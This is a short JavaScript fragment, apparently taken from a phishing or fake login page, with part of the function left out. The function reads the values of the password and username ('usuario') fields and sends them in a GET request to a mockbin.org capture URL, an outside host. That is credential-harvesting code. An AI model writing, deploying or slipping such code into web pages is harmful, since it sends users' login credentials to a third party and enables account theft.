function l(){
    ...
    a.open('GET', 'http://mockbin.org/bin/14bc364a-5203-41c2-a25d-c495e7093e0c?p='.concat(document.getElementById('password').value).concat('%26u=').concat(document.getElementById('usuario').value));
    a.send(null);
}
